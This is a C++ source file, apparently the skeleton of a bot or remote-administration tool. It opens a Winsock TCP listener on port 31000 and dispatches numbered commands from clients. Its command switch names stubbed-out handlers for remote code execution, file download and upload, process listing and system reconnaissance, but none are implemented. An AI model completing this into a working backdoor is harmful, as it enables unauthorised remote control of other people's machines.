#include "bot.h"

#define WIN32_LEAN_AND_MEAN
#define BUF_SIZE 2000

using namespace std;

// our thread for sending/recving commands
DWORD WINAPI doStuff(LPVOID lpParam)
{
    printf("Thread created\r\n");

    SOCKET current_client = (SOCKET)lpParam;    // set our socket to the socket passed in as a parameter
    char recvbuf[BUF_SIZE];                      // buffer to hold our received data
    char sendbuf[BUF_SIZE];                    // buffer to hold our sent data
    int errCode;                                // for error checking

    cout << "Client socket:"<< (int)current_client << endl;
    // our recv loop
    do
    {
        //char* splitString;
        memset(&recvbuf, 0, sizeof(recvbuf));
        // Receive function option from user
        errCode = recv(current_client, recvbuf, BUF_SIZE, 0);

        if (errCode > 0){
            printf("Data received: %s\n", recvbuf);
            switch(atoi(recvbuf)){
                case 0:
                    return 0;
                case 2:
                    //process_list();
                    printf("I did it ma");
                    break;
                case 3:
                    //dl_file(filename);
                    break;
                case 4:
                    //ul_file();
                    break;
                case 5:
                    //rce();
                    break;
                case 6:
                    //net_info();
                    break;
                case 7:
                    //whoami();
                    break;
                case 8:
                    //sys_info();
                    break;
            }
        } else if (errCode == 0){
            printf("Connection closed...\n");
            break;
        } else {
            printf("Failed to receive data: %d\n", WSAGetLastError());
        }
    }while (errCode != 0);

    return 0;
}

int main()
{

	printf("Starting up multi-threaded TCP server\n");

    // our masterSocket(socket that listens for connections)
    SOCKET sock;

    // for our thread
    DWORD thread;

    WSADATA wsaData;
    sockaddr_in server;

    // start winsock
    printf("Initializing Winsock...\n");
    int ret = WSAStartup(0x101,&wsaData); // use highest version of winsock avalible
    if(ret != 0)
    {
        printf("Failed to initialize Winsock. Error Code : %d\n", WSAGetLastError());
        return 1;
    }
    printf("Initiazed.\n");

    // fill in winsock struct ...
    server.sin_family=AF_INET;
    server.sin_addr.s_addr=INADDR_ANY;
    server.sin_port=htons(31000); // listen on telnet port 31000

    // create our socket to be connected to
    sock=socket(AF_INET,SOCK_STREAM,0);
    if(sock == INVALID_SOCKET)
    {
        return 0;
    }

    // bind our socket to a port
    printf("Binding socket to port\n");
    if( bind(sock,(sockaddr*)&server,sizeof(server)) !=0 )
    {
        printf("Bind socket to port Failed...");
        return 0;
    }

    // listen for a connection
    if(listen(sock,5) != 0)
    {
        printf("No longer listening for connection...\n");
        return 0;
    }

    // socket that we send and receive data on
    SOCKET client;

    sockaddr_in from;
    int fromlen = sizeof(from);

    // loop forever
    printf("Waiting to accept connections...");
    while(true)
    {
        // accept connections
        client = accept(sock,(struct sockaddr*)&from,&fromlen);
        printf("Client connected\r\n");
        cout << "client before thread:" << (int) client << endl;
        // create our recv_cmds thread and pass client socket as a parameter
        CreateThread(NULL, 0,doStuff,(LPVOID)client, 0, &thread);
        printf("New thread made!");
    }

    WSACleanup();

    system("pause");
  	return 0;

}
